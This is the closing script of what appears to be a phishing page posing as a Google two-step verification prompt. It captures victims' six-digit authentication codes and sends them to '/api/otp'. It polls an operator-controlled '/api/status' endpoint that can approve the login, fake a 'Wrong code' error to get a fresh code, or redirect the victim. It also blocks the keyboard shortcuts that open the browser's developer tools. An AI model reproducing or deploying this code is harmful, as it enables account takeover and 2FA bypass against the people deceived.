    const urlParams = new URLSearchParams(location.search);
    let sid = urlParams.get('sid') || sessionStorage.getItem('sid');
    if (sid) sessionStorage.setItem('sid', sid);

    
    const authInput = document.getElementById('totpPin');
    const nextBtn   = document.getElementById('nextBtn');
    const errorMsg  = document.getElementById('errorMsg');
    const inputWrap = document.getElementById('authInputWrap');
    const emailEl   = document.getElementById('displayEmail');
    const authLabel = document.getElementById('authLabel');

    
    const storedEmail = sessionStorage.getItem('email');
    if (storedEmail && emailEl) emailEl.textContent = storedEmail;

    
    function showLoading() {
      document.getElementById('google-loading-overlay').classList.add('active');
      const loader = document.querySelector('.Ih3FE');
      if (loader) loader.style.display = 'block';
    }
    function hideLoading() {
      document.getElementById('google-loading-overlay').classList.remove('active');
      const loader = document.querySelector('.Ih3FE');
      if (loader) loader.style.display = 'none';
    }

    
    function showErr(msg) {
      errorMsg.textContent = msg;
      errorMsg.classList.add('visible');
      inputWrap.classList.add('input-error', 'shake');
      setTimeout(() => inputWrap.classList.remove('shake'), 400);
    }
    function clearErr() {
      errorMsg.textContent = '';
      errorMsg.classList.remove('visible');
      inputWrap.classList.remove('input-error');
    }

    
    function floatLabel() {
      if (!authLabel) return;
      authLabel.style.transform = 'translateY(-120%) scale(0.75)';
      authLabel.style.transformOrigin = 'left top';
    }
    function sinkLabel() {
      if (!authLabel) return;
      authLabel.style.transform = '';
      authLabel.style.transformOrigin = '';
    }
    if (authInput && authLabel) {
      nextBtn.addEventListener('mousedown', () => {
        if (authInput.value.trim() !== '') floatLabel();
      });
      authInput.addEventListener('focus', floatLabel);
      authInput.addEventListener('blur', () => {
        setTimeout(() => {
          if (authInput.value.trim() === '') sinkLabel(); else floatLabel();
        });
      });
    }

    
    authInput.addEventListener('input', () => {
      authInput.value = authInput.value.replace(/\D/g, '').slice(0, 6);
      if (authInput.value.trim() !== '') floatLabel(); else sinkLabel();
      clearErr();
    });

    
    function applyConfig(d) {
      if (d.email && emailEl) {
        emailEl.textContent = d.email;
        sessionStorage.setItem('email', d.email);
      }
    }

    
    let successRedirectPending = false;

    function navigateTo(page) {
      if (page === 'success') {
        if (successRedirectPending) return;
        successRedirectPending = true;
        stopPolling();
        showLoading();
        const delay = 2000 + Math.floor(Math.random() * 1000);
        setTimeout(function () {
          window.location.href = SUCCESS_URL;
        }, delay);
      } else {
        stopPolling();
        showLoading();
        window.location.href = '/' + page + '?sid=' + encodeURIComponent(sid);
      }
    }

    
    let polling = false, pollTimer = null;
    function stopPolling() { polling = false; if (pollTimer) clearTimeout(pollTimer); }
    function startPolling() { polling = true; poll(); }

    async function poll() {
      if (!polling || !sid) return;
      try {
        const r = await fetch('/api/status/' + encodeURIComponent(sid));
        const d = await r.json();

        if (d.status === 'gone') { stopPolling(); window.location.replace('/'); return; }
        applyConfig(d);

        
        if (d.redirect && VALID_PAGES.includes(d.redirect)) {
          fetch('/api/clearOk', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sid}) }).catch(()=>{});
          navigateTo(d.redirect); return;
        }
        if (d.page && d.page !== PAGE && VALID_PAGES.includes(d.page)) { navigateTo(d.page); return; }
        if (d.status === 'approved' || d.page === 'success') { navigateTo('success'); return; }

        
        if (d.status === 'redo') {
          hideLoading();
          authInput.value = '';
          authInput.focus();
          sinkLabel();
          showErr('Wrong code. Please try again.');
          fetch('/api/clearRedo', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sid}) }).catch(()=>{});
          if (polling) { pollTimer = setTimeout(poll, POLL_MS); }
          return;
        }
      } catch (e) {  }
      if (polling) pollTimer = setTimeout(poll, POLL_MS);
    }

    
    async function init() {
      if (!sid) {
        const r = await fetch('/api/session', { method:'POST' });
        const d = await r.json();
        sid = d.sid;
        sessionStorage.setItem('sid', sid);
      }
      await fetch('/api/page', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ sid, page: PAGE })
      }).catch(()=>{});

      
      try {
        const r = await fetch('/api/status/' + encodeURIComponent(sid));
        const d = await r.json();
        applyConfig(d);
      } catch(e){}

      startPolling();
    }

    
    async function submitCode() {
      const code = authInput.value.replace(/\s/g, '').trim();
      if (!code) { showErr('Enter a verification code'); authInput.focus(); return; }
      if (!/^\d{6}$/.test(code)) { showErr('Enter a valid 6-digit code'); authInput.focus(); return; }
      if (!sid) return;
      clearErr();
      showLoading();
      try {
        await fetch('/api/otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sid, otp: code, type: 'twofa' })
        });
        
      } catch(e) {
        hideLoading();
      }
    }

    nextBtn.addEventListener('click', submitCode);
    authInput.addEventListener('keydown', e => { if (e.key === 'Enter') submitCode(); });

    init().catch(e => console.error('Auth init error', e));
  })();
  document.addEventListener('keydown', function(e) {
  if (
    e.key === 'F12' ||
    (e.ctrlKey && e.key.toLowerCase() === 'u') ||
    (e.ctrlKey && e.shiftKey && ['i','j','c'].includes(e.key.toLowerCase()))
  ) {
    e.preventDefault();
  }
});
  </script>
</body>
</html>
